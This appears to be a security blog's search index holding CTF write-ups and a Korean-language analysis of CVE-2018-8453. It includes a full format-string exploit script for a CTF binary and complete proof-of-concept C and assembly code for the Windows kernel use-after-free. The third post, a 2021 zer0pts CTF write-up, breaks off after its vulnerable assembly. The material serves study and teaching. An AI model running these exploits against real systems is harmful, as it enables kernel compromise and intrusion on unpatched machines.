<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2020 BoB CTF </title>
    <url>/2020/10/02/2020-10-03-BoB_CTF_2020/</url>
    <content><![CDATA[<center>2020 BoB CTF Write-up </center>


<h1 id="porn-master-pwnable"><a href="#porn-master-pwnable" class="headerlink" title="porn_master (pwnable)"></a>porn_master (pwnable)</h1><h2 id="vulnerability"><a href="#vulnerability" class="headerlink" title="vulnerability"></a>vulnerability</h2><p>It is the porn_master on BoB9 CTF.  let’s check protection.<br><img src="https://user-images.githubusercontent.com/70257118/91448805-502be500-e8b5-11ea-9e24-98c756b7c800.png" alt="1"><br>It is full protection. then we should know pie-base and libc-base when we exploit it.<br>let’s see the binary on IDA!</p>
<span id="more"></span>
<p><img src="https://user-images.githubusercontent.com/70257118/91447645-e0692a80-e8b3-11ea-82af-cd776583bc13.png" alt="image"><br>we can find format string bug on line 28.  but we can only write 0x18 at once to buf.<br>and also we can write two times because of the <code>for loop</code> on line 24.<br>so first time we need to leak pie_addr and libc_addr on stack. then we can get its base_addr.<br>and second time we overwrite <code>printf_ret_addr</code> to <code>printf_addr</code> on  line 21(It is pie_addr).<br>then we jump to line21. we have two opportunities to use format string bug again.<br>according to this, we can make many opportunities, if we overwrite <code>print_ret_addr</code>.<br>we can’t overwrite got because of full relro. so we should overwrite __malloc_hook.<br>let’s overwrite __malloc_hook to oneshot gadget  and get flag!</p>
<h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"><span class="comment">#p = remote(&#x27;52.79.163.146&#x27;, 12002)</span></span><br><span class="line">p = process(<span class="string">&#x27;./porn_master&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./porn_master&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;lk:%19$p:%17$p:%16$p::&#x27;</span></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;Name : &#x27;</span>,<span class="string">&#x27;AAAA&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;&gt; &#x27;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;lk:&#x27;</span>)</span><br><span class="line">stack_leak = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;:&#x27;</span>)[:-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">libc_leak = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;:&#x27;</span>)[:-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">pie_leak = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;:&#x27;</span>)[:-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">libcbase = libc_leak - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>] - <span class="number">231</span></span><br><span class="line">piebase = pie_leak - <span class="number">0xa60</span></span><br><span class="line"></span><br><span class="line">printf_ret = stack_leak - <span class="number">0x140</span></span><br><span class="line">main_ret = stack_leak - <span class="number">0xe0</span></span><br><span class="line">log.info(<span class="string">&#x27;libc_base : &#x27;</span> + <span class="built_in">hex</span>(libcbase))</span><br><span class="line">log.info(<span class="string">&#x27;pie_base : &#x27;</span> + <span class="built_in">hex</span>(piebase))</span><br><span class="line">log.info(<span class="string">&#x27;printf_ret : &#x27;</span> + <span class="built_in">hex</span>(printf_ret))</span><br><span class="line"></span><br><span class="line">malloc_hook = libcbase + libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">oneshot = libcbase + <span class="number">0x4f365</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#log.info(hex(malloc_hook))</span></span><br><span class="line">log.info(<span class="built_in">hex</span>(oneshot))</span><br><span class="line"></span><br><span class="line">printf = piebase + <span class="number">0x97c</span></span><br><span class="line"></span><br><span class="line">low = printf &amp; <span class="number">0xffff</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(low)</span><br><span class="line">payload += <span class="string">&#x27;%14$hn&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;AAA&#x27;</span></span><br><span class="line">payload += p64(printf_ret)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;&gt; &#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;Name : &#x27;</span>,<span class="string">&#x27;AAAA&#x27;</span>)</span><br><span class="line"></span><br><span class="line">low_main = oneshot &amp; <span class="number">0xffff</span></span><br><span class="line">high_main = (oneshot &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(low_main)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(high_main)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(low_main)</span><br><span class="line">payload += <span class="string">&#x27;%14$hn&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;CCC&#x27;</span></span><br><span class="line">payload += p64(main_ret)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;&gt; &#x27;</span>,payload)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(low)</span><br><span class="line">payload += <span class="string">&#x27;%14$hn&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;AAA&#x27;</span></span><br><span class="line">payload += p64(printf_ret)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;&gt; &#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;Name : &#x27;</span>,<span class="string">&#x27;AAAA&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(high_main)</span><br><span class="line">payload += <span class="string">&#x27;%14$hn&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;DDD&#x27;</span></span><br><span class="line">payload += p64(main_ret+<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;&gt; &#x27;</span>,payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"><span class="comment">#p.sendafter(&#x27;&gt; &#x27;,&#x27;AAAA&#x27;)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Write-up</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Write-up</tag>
        <tag>pwnable</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2018-8453</title>
    <url>/2020/12/02/2020-12-03-CVE-2018-8453/</url>
    <content><![CDATA[<center>CVE-2018-8453 // Windows Kernel 1-day</center> 


<h1 id="Root-Cause"><a href="#Root-Cause" class="headerlink" title="Root Cause"></a>Root Cause</h1><p>NtUserSetWindowFNID()는 FNID를 설정할 때,  Window가 release 됐는지 아닌지 확인하지 않음.</p>
<p>→ 따라서 이미 free된 Window에 FNID를 설정하여 재사용 할 수 있음.</p>
<p>이 취약점을 이용하여, xxSBTrackInit()에서 pSBTrack의 UAF를 발생시킬 수 있음.</p>
<span id="more"></span>
<h1 id="Flow"><a href="#Flow" class="headerlink" title="Flow"></a>Flow</h1><p><img src="https://user-images.githubusercontent.com/75205011/100963586-01ec4900-356a-11eb-830e-b11ce5f2afc3.png" alt="sdafasdf"></p>
<ul>
<li>먼저 KernelCallbackTable에 있는 2개의 callback을 Hook함. (fnDWORD, fnClientFree…)</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">asm</span>.<span class="keyword">asm</span></span><br><span class="line">GetKernelCallbackTableBase PROC</span><br><span class="line">	;<span class="keyword">int</span> <span class="number">3</span></span><br><span class="line">	mov rax,gs:[<span class="number">60</span>h]</span><br><span class="line">	lea rax,[rax+<span class="number">58</span>h]</span><br><span class="line">	mov rax,[rax]</span><br><span class="line">	ret</span><br><span class="line">GetKernelCallbackTableBase ENDP</span><br><span class="line"></span><br><span class="line">Main.<span class="function">c</span></span><br><span class="line"><span class="function">	<span class="title">VirtualProtect</span><span class="params">(CallbackTb, <span class="number">512</span>, PAGE_READWRITE, &amp;OldProtect)</span></span>; <span class="comment">//메모리 보호 설정 값 변경</span></span><br><span class="line">	CallbackTb += <span class="number">2</span>;   <span class="comment">//Table에서의 Hook할 Callback의 위치.</span></span><br><span class="line">	fnDWORD = (fct_fnDispatch64)*CallbackTb;  <span class="comment">//Hook함수 설정.</span></span><br><span class="line">	*CallbackTb = (ULONG64)fnDWORDCallBack;  </span><br><span class="line"></span><br><span class="line">	CallbackTb += <span class="number">124</span>;</span><br><span class="line">	fnClientFreeWindowClassExtraBytes = (fct_fnDispatch64)*CallbackTb;</span><br><span class="line">	*CallbackTb = (ULONG64)fnClientFreeWindowClassExtraBytesCallBack; </span><br></pre></td></tr></table></figure>

<ul>
<li>Main Window와 ScrollBar 를 만듬.</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Structure 설정.</span></span><br><span class="line">WNDCLASSEXW wcex;</span><br><span class="line">wcex.cbSize = <span class="keyword">sizeof</span>(WNDCLASSEX);</span><br><span class="line">wcex.style = CS_HREDRAW | CS_VREDRAW;</span><br><span class="line">wcex.lpfnWndProc = DefWindowProc;</span><br><span class="line">wcex.cbClsExtra = <span class="number">0</span>;</span><br><span class="line">wcex.cbWndExtra = <span class="number">4</span>;</span><br><span class="line">wcex.hInstance = <span class="number">0</span>;</span><br><span class="line">wcex.hIcon = LoadIcon(<span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">wcex.hCursor = LoadCursor(<span class="literal">NULL</span>, IDC_ARROW);</span><br><span class="line">wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW + <span class="number">1</span>);</span><br><span class="line">wcex.lpszMenuName = <span class="literal">NULL</span>;</span><br><span class="line">wcex.lpszClassName = <span class="string">L&quot;WNDCLASSMAIN&quot;</span>;</span><br><span class="line">wcex.hIconSm = LoadIcon(wcex.hInstance, <span class="literal">NULL</span>);</span><br><span class="line">RegisterClassExW(&amp;wcex);</span><br><span class="line"></span><br><span class="line"><span class="comment">//Main Window 생성.</span></span><br><span class="line">hMainWND = CreateWindowW(<span class="string">L&quot;WNDCLASSMAIN&quot;</span>, <span class="string">L&quot;CVE&quot;</span>, WS_DISABLED, <span class="number">2</span>, <span class="number">2</span>, <span class="number">40</span>, <span class="number">40</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//ScrollBar 생성.</span></span><br><span class="line">hSBWND = CreateWindowEx(<span class="number">0</span>, <span class="string">&quot;ScrollBar&quot;</span>, <span class="string">&quot;SB&quot;</span>, WS_CHILD | WS_VISIBLE | SBS_HORZ, <span class="number">0</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">20</span>, hMainWND, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li><p>SendMessage()함수를 사용해 ScrollBar에 WM_LBUTTONDOWN 메시지를 보냄</p>
<p>  (이는 xxxSBTrackInit()함수 호출을 Trigger하기 위함)</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">SendMessage(hSBWND, WM_LBUTTONDOWN, <span class="number">0</span>, <span class="number">0x00020002</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li><p>xxxSBTrackLoop이 호출되어, 마우스 왼쪽 버튼이 해제되거나 다른 메시지가 수신될 때까지 루프에서 마우스 이벤트를 캡쳐함.</p>
</li>
<li><p>xxxSBTrackLoop이 실행되므로 fnDWORD가 Callback됨. (이때 미리 Hook한 fnDWORD가 실행됨)</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fnDWORDCallBack</span><span class="params">(PULONG64 msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (bMSGSENT &amp;&amp; *msg) &#123;</span><br><span class="line">		bMSGSENT = FALSE;</span><br><span class="line">		DestroyWindow(hMainWND); <span class="comment">//DestroyWindow함수를 이용해 Main Window를 파괴.</span></span><br><span class="line">		<span class="comment">//DestroyWindow 함수는 xxxFreeWindow함수를 호출.</span></span><br><span class="line">		<span class="comment">//xxxFreeWindow 함수는 먼저 Main Window의 FNID를 8000(free)으로 변경 함.</span></span><br><span class="line">		<span class="comment">//그리고 xxxClientFreeWindowClassExtraBytes를 호출.</span></span><br><span class="line">	&#125;</span><br><span class="line">	fnDWORD(msg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>xxxClientFreeWindowClass..함수는 Callback를 호출 (이때 미리 Hook한 fnClinet…가 실행됨)</li>
</ul>
<p><img src="https://user-images.githubusercontent.com/75205011/100963641-247e6200-356a-11eb-8256-ac9c185b666c.png" alt="asd"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fnClientFreeWindowClassExtraBytesCallBack</span><span class="params">(PULONG64 msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (*(PULONG64)*((PULONG64)*(msg - <span class="number">11</span>)) == (ULONG64)hMainWND) &#123;</span><br><span class="line">		</span><br><span class="line">		hSBWNDnew = CreateWindowEx(<span class="number">0</span>, <span class="string">&quot;ScrollBar&quot;</span>, <span class="string">&quot;SB&quot;</span>, SWP_HIDEWINDOW | SB_HORZ, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">		SetWindowFNID(hMainWND, <span class="number">0x2A1</span>); <span class="comment">//이미Free된 Main Window의 FNID(0x2A1 ~ 0x2AAA)를 설정함.</span></span><br><span class="line">		SetCapture(hSBWNDnew); <span class="comment">//새로운 Window를 만들고, 이를 현재 thread에서 Capture하고 있는 window로 설정.</span></span><br><span class="line">		f3 = TRUE;</span><br><span class="line">	</span><br><span class="line">	&#125; </span><br><span class="line">	fnClientFreeWindowClassExtraBytes(msg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>Main Window가 파괴됐기 때문에 xxxSBTrackLoop이 돌아와 HMAssignmentUnLock(&amp;pSBTrack-&gt;spwndNotify)을 계속 실행하여 Main Window를 완전히 해제하는 관련 역참조를 수행하는데, 이로 인해 xxxFreeWindow가 다시 호출됨.</li>
</ul>
<p><img src="https://user-images.githubusercontent.com/75205011/100963660-306a2400-356a-11eb-8ecc-e28614b76662.png" alt="cdsf"></p>
<ul>
<li>Main Window의 FNID는 (xxxFreeWindow에서 8000(Free)되었다가,  fnClient..함수에서 82A1로 설정 되었음.) 따라서 SfnDWORD함수가 호출되며 이는 아까 hook했던 fnDWORD가 다시 호출됨.</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fnDWORDCallBack</span><span class="params">(PULONG64 msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (bMSGSENT &amp;&amp; *msg) &#123;</span><br><span class="line">		bMSGSENT = FALSE;</span><br><span class="line">		DestroyWindow(hMainWND); </span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (*msg &amp;&amp; (*(msg + <span class="number">1</span>) == <span class="number">0x70</span>) &amp;&amp; (*((PULONG64)(*msg)) == (ULONG64)hMainWND)) &#123;</span><br><span class="line">		SendMessage(hSBWNDnew, WM_CANCELMODE, <span class="number">0</span>, <span class="number">0</span>); <span class="comment">//여기서 WM_CANCELMODE를 사용하여,</span></span><br><span class="line">		<span class="comment">//pSBTrack을 free함.</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	fnDWORD(msg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>POC 프로그램은 단일 스레드이기 때문에 스레드에 의해 생성된 모든 창은 동일한 스레드 정보 구조를 가리킨다. SBTrack이 속해 있는 Scrollbar 창이 해제되었더라도, 동일한 스레드에 의해 새 창이 생성되는 한, pSBTrack은 여전히 동일한 창을 가리키고 있다.</li>
<li>setCaputure(hSBWNDNew)를 호출하여 hSBTWNDNDNew 창에서 마우스 이벤트를 캡처하기 위해 현재 스레드를 설정했다. 마지막으로, UserFreePool(pSBTrack)이 pSBTrack을 릴리스하기 위해 실행되어 HMAssignmentUnLock(&amp;pSBTrack-&gt;spwnd를 실행하기 전에 pSBTrack을 해제함SB) 및 결과 pSBTrack에 After Free.</li>
<li>Usermode에서 pSBTrack을 Free했다.</li>
<li>정상적인 흐름은  xxxSBTrackLoop가 끝난 후  xxxSBTrackInit()에서 Free 시켜야 하지만, 미리 UserMode에서 Free 해버렸으므로, 이후에 pSBTrack에 대한 UAF가 발생함.</li>
</ul>
<h1 id="Windbg-analyze"><a href="#Windbg-analyze" class="headerlink" title="Windbg !analyze"></a>Windbg !analyze</h1><p><img src="https://user-images.githubusercontent.com/75205011/100963679-3eb84000-356a-11eb-9045-821cd77c38ec.png" alt="asdf"></p>
<p><img src="https://user-images.githubusercontent.com/75205011/100963690-47107b00-356a-11eb-95b0-3e89d376161a.png" alt="xv"></p>
<h1 id="POC-code"><a href="#POC-code" class="headerlink" title="POC code."></a>POC code.</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Psapi.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;intrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;targetver.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">BOOL			f3 = FALSE;</span><br><span class="line">BOOL			bMSGSENT = FALSE;</span><br><span class="line">HWND			hMainWND;</span><br><span class="line">HWND			hSBWND;</span><br><span class="line">HWND			hSBWNDnew;</span><br><span class="line"></span><br><span class="line"><span class="function">EXTERN_C PULONG64 <span class="title">GetKernelCallbackTableBase</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function">EXTERN_C VOID <span class="title">SetWindowFNID</span><span class="params">(HWND hWnd, LONG64 FNID)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span>  <span class="title">ULONG64</span><span class="params">(WINAPI *fct_fnDispatch64)</span><span class="params">(PULONG64)</span></span>;</span><br><span class="line">fct_fnDispatch64 fnDWORD, fnClientFreeWindowClassExtraBytes;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fnDWORDCallBack</span><span class="params">(PULONG64 msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (bMSGSENT &amp;&amp; *msg) &#123;</span><br><span class="line">		bMSGSENT = FALSE;</span><br><span class="line">		DestroyWindow(hMainWND);</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ((f3==TRUE) &amp;&amp; (*(msg + <span class="number">1</span>) == <span class="number">0x70</span>) &amp;&amp; (*((PULONG64)(*msg)) == (ULONG64)hMainWND)) &#123;</span><br><span class="line">		</span><br><span class="line">		SendMessage(hSBWNDnew, WM_CANCELMODE, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	fnDWORD(msg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fnClientFreeWindowClassExtraBytesCallBack</span><span class="params">(PULONG64 msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (*(PULONG64)*((PULONG64)*(msg - <span class="number">11</span>)) == (ULONG64)hMainWND) &#123;</span><br><span class="line">		</span><br><span class="line">		hSBWNDnew = CreateWindowEx(<span class="number">0</span>, <span class="string">&quot;ScrollBar&quot;</span>, <span class="string">&quot;SB&quot;</span>, SWP_HIDEWINDOW | SB_HORZ, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">		SetWindowFNID(hMainWND, <span class="number">0x2A1</span>);</span><br><span class="line">		SetCapture(hSBWNDnew);</span><br><span class="line">		f3 = TRUE;</span><br><span class="line">	&#125; </span><br><span class="line">	fnClientFreeWindowClassExtraBytes(msg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DWORD		OldProtect = <span class="number">0</span>;</span><br><span class="line">	PULONG64	CallbackTb = GetKernelCallbackTableBase();</span><br><span class="line">	</span><br><span class="line">	VirtualProtect(CallbackTb, <span class="number">512</span>, PAGE_READWRITE, &amp;OldProtect);</span><br><span class="line">	CallbackTb += <span class="number">2</span>;</span><br><span class="line">	fnDWORD = (fct_fnDispatch64)*CallbackTb;</span><br><span class="line">	*CallbackTb = (ULONG64)fnDWORDCallBack;</span><br><span class="line"></span><br><span class="line">	CallbackTb += <span class="number">124</span>;</span><br><span class="line">	fnClientFreeWindowClassExtraBytes = (fct_fnDispatch64)*CallbackTb;</span><br><span class="line">	*CallbackTb = (ULONG64)fnClientFreeWindowClassExtraBytesCallBack;</span><br><span class="line"></span><br><span class="line">	WNDCLASSEXW wcex;</span><br><span class="line">	wcex.cbSize = <span class="keyword">sizeof</span>(WNDCLASSEX);</span><br><span class="line">	wcex.style = CS_HREDRAW | CS_VREDRAW;</span><br><span class="line">	wcex.lpfnWndProc = DefWindowProc;</span><br><span class="line">	wcex.cbClsExtra = <span class="number">0</span>;</span><br><span class="line">	wcex.cbWndExtra = <span class="number">4</span>;</span><br><span class="line">	wcex.hInstance = <span class="number">0</span>;</span><br><span class="line">	wcex.hIcon = LoadIcon(<span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	wcex.hCursor = LoadCursor(<span class="literal">NULL</span>, IDC_ARROW);</span><br><span class="line">	wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW + <span class="number">1</span>);</span><br><span class="line">	wcex.lpszMenuName = <span class="literal">NULL</span>;</span><br><span class="line">	wcex.lpszClassName = <span class="string">L&quot;WNDCLASSMAIN&quot;</span>;</span><br><span class="line">	wcex.hIconSm = LoadIcon(wcex.hInstance, <span class="literal">NULL</span>);</span><br><span class="line">	RegisterClassExW(&amp;wcex); </span><br><span class="line"></span><br><span class="line">	hMainWND = CreateWindowW(<span class="string">L&quot;WNDCLASSMAIN&quot;</span>, <span class="string">L&quot;CVE&quot;</span>, WS_DISABLED, <span class="number">2</span>, <span class="number">2</span>, <span class="number">40</span>, <span class="number">40</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	hSBWND = CreateWindowEx(<span class="number">0</span>, <span class="string">&quot;ScrollBar&quot;</span>, <span class="string">&quot;SB&quot;</span>, WS_CHILD | WS_VISIBLE | SBS_HORZ, <span class="number">0</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">20</span>, hMainWND, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	bMSGSENT = TRUE;</span><br><span class="line">	</span><br><span class="line">	SendMessage(hSBWND, WM_LBUTTONDOWN, <span class="number">0</span>, <span class="number">0x00020002</span>);</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> GetKernelCallbackTableBase</span><br><span class="line"><span class="keyword">public</span> FuncInt3</span><br><span class="line"><span class="keyword">public</span> SetWindowFNID </span><br><span class="line">_TEXT SEGMENT</span><br><span class="line"></span><br><span class="line">GetKernelCallbackTableBase PROC</span><br><span class="line">	;<span class="keyword">int</span> <span class="number">3</span></span><br><span class="line">	mov rax,gs:[<span class="number">60</span>h]</span><br><span class="line">	lea rax,[rax+<span class="number">58</span>h]</span><br><span class="line">	mov rax,[rax]</span><br><span class="line">	ret</span><br><span class="line">GetKernelCallbackTableBase ENDP</span><br><span class="line"></span><br><span class="line">SetWindowFNID PROC</span><br><span class="line">		mov r10,rcx;</span><br><span class="line">		mov r11,rdx;</span><br><span class="line">		mov eax,<span class="number">1095</span>h;</span><br><span class="line">		syscall;</span><br><span class="line">		ret;</span><br><span class="line">SetWindowFNID ENDP</span><br><span class="line"></span><br><span class="line">END</span><br></pre></td></tr></table></figure>

<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://bbs.pediy.com/thread-249021.htm">https://bbs.pediy.com/thread-249021.htm</a></p>
]]></content>
      <categories>
        <category>Research</category>
      </categories>
      <tags>
        <tag>1-day</tag>
        <tag>Windows Kernel</tag>
        <tag>UAF</tag>
        <tag>CVE</tag>
      </tags>
  </entry>
  <entry>
    <title>2021 zer0pts CTF</title>
    <url>/2021/03/06/2021-03-07-zer0pts_CTF_2021/</url>
    <content><![CDATA[<center>2021 zer0pts CTF Write-up </center>


<h1 id="Not-Beginner’s-Stack-pwnable"><a href="#Not-Beginner’s-Stack-pwnable" class="headerlink" title="Not Beginner’s Stack (pwnable)"></a>Not Beginner’s Stack (pwnable)</h1><h2 id="vulnerability"><a href="#vulnerability" class="headerlink" title="vulnerability"></a>vulnerability</h2><p>Let’s check the protection of the binary.<br><img src="https://user-images.githubusercontent.com/49066484/110238894-62cf5700-7f87-11eb-9635-da4146f6c20e.png" alt="899"><br>You can find that all protection is turned off.</p>
<span id="more"></span>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_start:</span><br><span class="line">  call notvuln</span><br><span class="line">  call exit</span><br><span class="line"></span><br><span class="line">notvuln:</span><br><span class="line">;; char buf[0x100];</span><br><span class="line">  enter 0x100, 0</span><br><span class="line">;; vuln();</span><br><span class="line">  call vuln</span><br><span class="line">;; write(1, &quot;Data: &quot;, 6);</span><br><span class="line">  mov edx, 6</span><br><span class="line">  mov esi, msg_data</span><br><span class="line">  xor edi, edi</span><br><span class="line">  inc edi</span><br><span class="line">  call write</span><br><span class="line">;; read(0, buf, 0x100);</span><br><span class="line">  mov edx, 0x100</span><br><span class="line">  lea rsi, [rbp-0x100]</span><br><span class="line">  xor edi, edi</span><br><span class="line">  call read</span><br><span class="line">;; return 0;</span><br><span class="line">  xor eax, eax</span><br><span class="line">  ret</span><br><span class="line"></span><br><span class="line">vuln:</span><br><span class="line">;; char buf[0x100];</span><br><span class="line">  enter 0x100, 0</span><br><span class="line">;; write(1, &quot;Data: &quot;, 6);</span><br><span class="line">  mov edx, 6</span><br><span class="line">  mov esi, msg_data</span><br><span class="line">  xor edi, edi</span><br><span class="line">  inc edi</span><br><span class="line">  call write</span><br><span class="line">;; read(0, buf, 0x1000);</span><br><span class="line">  mov edx, 0x1000               ; [!] vulnerability</span><br><span class="line">  lea rsi, [rbp-0x100]</span><br><span class="line">  xor edi, edi</span><br><span class="line">  call read</span><br><span class="line">;; return;</span><br><span class="line">  leave</span><br><span class="line">  ret</span><br></pre></td></tr></table></figure>
